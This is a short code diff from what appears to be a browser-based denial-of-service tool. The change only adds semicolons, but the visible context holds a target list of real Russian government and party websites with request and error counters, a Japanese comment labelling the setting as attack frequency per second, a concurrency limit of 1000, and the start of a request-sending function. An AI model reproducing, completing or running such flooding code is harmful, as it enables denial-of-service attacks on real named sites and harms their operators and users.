@@ -182,11 +182,11 @@ if($input_noun != ""){
            'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // 公正ロシア
            'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },             // 南クリル管区
            'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区
-    	  }    
+    	  };
       
       // 1秒ごとの攻撃頻度
-      var CONCURRENCY_LIMIT = 1000
-      var queue = []
+      var CONCURRENCY_LIMIT = 1000;
+      var queue = [];
 
       // リクエスト送信
       async function fetchWithTimeout(resource, options) {
